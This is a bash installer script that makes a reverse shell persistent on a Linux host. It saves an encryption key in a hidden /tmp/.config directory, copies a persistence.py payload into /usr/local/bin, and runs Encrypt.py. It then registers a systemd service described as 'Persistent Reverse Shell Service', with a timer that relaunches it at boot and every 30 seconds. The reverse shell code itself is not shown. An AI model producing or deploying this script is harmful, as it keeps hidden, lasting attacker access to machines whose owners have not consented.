#!/bin/bash

# Variables
SERVICE_NAME=persistence
TIMER_NAME=${SERVICE_NAME}.timer
SERVICE_DESCRIPTION="Persistent Reverse Shell Service"
TIMER_DESCRIPTION="Timer for ${SERVICE_NAME}"
EXEC_PATH="/usr/bin/python3 /usr/local/bin/persistence"
KEY_PATH="/tmp/.config/key"

# Ask for the encryption key
read -p "Enter the encryption key: " encryption_key

# Check if /tmp/.config exists, if not, create it
[ ! -d "/tmp/.config" ] && mkdir -p "/tmp/.config"

# Save the key
echo $encryption_key > $KEY_PATH

# Path where the Python script will be copied
TARGET_DIR="/usr/local/bin"

# Install the cryptography package
echo "Installing the cryptography Python package..."
pip install cryptography

# Copy the script to the target directory
echo "Copying persistence.py to $TARGET_DIR..."
cp persistence.py $TARGET_DIR/persistence

# Make the script executable
echo "Setting executable permissions for persistence.py..."
chmod +x $TARGET_DIR/persistence

# Execute Encrypt.py
echo "Executing Encrypt.py..."
python3 Encrypt.py

# Create the systemd service file for persistence.py
echo "Creating systemd service file for $SERVICE_NAME..."
cat <<EOF > /etc/systemd/system/$SERVICE_NAME.service
[Unit]
Description=$SERVICE_DESCRIPTION
After=network.target

[Service]
ExecStart=$EXEC_PATH
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF

# Create the systemd timer file for the service
echo "Creating systemd timer file for $TIMER_NAME..."
cat <<EOF > /etc/systemd/system/$TIMER_NAME
[Unit]
Description=$TIMER_DESCRIPTION

[Timer]
OnBootSec=30sec
OnUnitActiveSec=30sec
Unit=$SERVICE_NAME.service

[Install]
WantedBy=timers.target
EOF

# Enable and start the timer
echo "Enabling and starting $TIMER_NAME..."
systemctl enable $TIMER_NAME
systemctl start $TIMER_NAME

echo "$TIMER_NAME installed and started."
